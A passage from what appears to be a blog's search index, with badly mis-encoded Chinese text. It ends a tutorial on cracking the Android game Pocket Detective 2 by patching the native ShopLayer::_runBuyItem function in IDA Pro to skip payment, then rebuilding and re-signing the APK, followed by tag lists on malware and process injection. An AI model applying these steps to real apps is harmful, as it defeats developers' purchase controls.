·ï¼Œä¿®æ”¹ShopLayer::_runBuyItemçš„å¼€å¤´ï¼Œè®©å®ƒç›´æ¥è°ƒç”¨ShopLayer::_completeBuyItem Keypatchä¿®æ”¹nativeå‡½æ•°å†…å®¹åœ¨æ±‡ç¼–çª—å£é‡Œå®šä½åˆ°ShopLayer::_runBuyItemï¼Œä».text:0015FB76å¼€å§‹ä¿®æ”¹ï¼Œç»™å‚æ•°èµ‹å€¼ã€è°ƒç”¨ShopLayer::_completeBuyItemï¼Œç„¶åè·³åˆ°å‡½æ•°æœ«å°¾ã€‚ ä¿®æ”¹åï¼š Editâ†’Patch programâ†’Apply patches to input fileï¼Œå°†ä¿®æ”¹å†™åˆ°æ–‡ä»¶é‡Œã€‚ apktoolé‡æ‰“åŒ…å¹¶ç­¾ååœ¨é‡æ‰“åŒ…å‰ï¼Œè®°å¾—å°†lib/armeabiè·¯å¾„ä¸‹IDA Proç”Ÿæˆçš„idbæ–‡ä»¶ç§»å‡ºæ¥ï¼Œä»¥å…è¿™ä¸ªæ–‡ä»¶è¢«æ‰“åŒ…è¿›apkã€‚ é‡æ‰“åŒ…ã€ç­¾åçš„æ“ä½œå’Œå£è¢‹ä¾¦æ¢1ç›¸åŒï¼Œæ³¨æ„ä½¿ç”¨Java jdk1.8.0_202ç‰ˆæœ¬æˆ–è¿™ä¸ªé™„è¿‘çš„ç‰ˆæœ¬çš„keytoolå’Œjarsignerã€‚ 1234apktool b .cd distkeytool -genkey -v -keystore my-release-key.keystore -alias cert -keyalg RSA -keysize 2048 -sigalg SHA1withRSA -validity 10000jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore koudaizhentan2.apk cert å®‰è£…APKï¼Œè¿è¡Œï¼š","link":"/2024/02/22/crack-koudaizhentan-2/"}],"tags":[{"name":"Android","slug":"Android","link":"/tags/Android/"},{"name":"AIDL","slug":"AIDL","link":"/tags/AIDL/"},{"name":"VMWare","slug":"VMWare","link":"/tags/VMWare/"},{"name":"HTML","slug":"HTML","link":"/tags/HTML/"},{"name":"iframe","slug":"iframe","link":"/tags/iframe/"},{"name":"ç—…æ¯’","slug":"ç—…æ¯’","link":"/tags/%E7%97%85%E6%AF%92/"},{"name":"å‹’ç´¢è½¯ä»¶","slug":"å‹’ç´¢è½¯ä»¶","link":"/tags/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6/"},{"name":"è¯±é¥µæ–‡ä»¶","slug":"è¯±é¥µæ–‡ä»¶","link":"/tags/%E8%AF%B1%E9%A5%B5%E6%96%87%E4%BB%B6/"},{"name":"é€†å‘åˆ†æ","slug":"é€†å‘åˆ†æ","link":"/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"},{"name":"ç»“æ„ä½“","slug":"ç»“æ„ä½“","link":"/tags/%E7%BB%93%E6%9E%84%E4%BD%93/"},{"name":"å‡½æ•°","slug":"å‡½æ•°","link":"/tags/%E5%87%BD%E6%95%B0/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","link":"/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"å†…æ ¸ç¼–ç¨‹","slug":"å†…æ ¸ç¼–ç¨‹","link":"/tags/%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B/"},{"name":"é€šçŸ¥ä¸å›è°ƒ","slug":"é€šçŸ¥ä¸å›è°ƒ","link":"/tags/%E9%80%9A%E7%9F%A5%E4%B8%8E%E5%9B%9E%E8%B0%83/"},{"name":"å†…å­˜","slug":"å†…å­˜","link":"/tags/%E5%86%85%E5%AD%98/"},{"name":"è¿œç¨‹çº¿ç¨‹","slug":"è¿œç¨‹çº¿ç¨‹","link":"/tags/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B/"},{"name":"DLLæ³¨å…¥","slug":"DLLæ³¨å…¥","link":"/tags/DLL%E6%B3%A8%E5%85%A5/"},{"name":"çº¿ç¨‹","slug":"çº¿ç¨‹","link":"/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"è¿›ç¨‹æ³¨å…¥","slug":"è¿›ç¨‹æ³¨å…¥","link":"/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"},{"name":"PEæ–‡ä»¶","slug":"PEæ–‡ä»¶","link":"/tags/PE%E6%96%87%E4%BB%B6/"},{"name":"é‡å®šä½","slug":"é‡å®šä½","link":"/tags/%E9%87%8D%E5%AE%9A%E4%BD%8D/"},{"name":"reverse","slug":"reverse","link":"/tags/reverse/"}],"categories":[{"name":"Android","slug":"Android","link":"/categories/Android/"},{"name":"Web","slug":"Web","link":"/categories/Web/"},{"name":"Malware","slug":"Malware","link":"/categories/Malware/"},{"name":"Reverse","slug":"Reverse","link":"/categories/Reverse/"},{"name":"Windows","slug":"Windows","link":"/categories/Windows/"}]}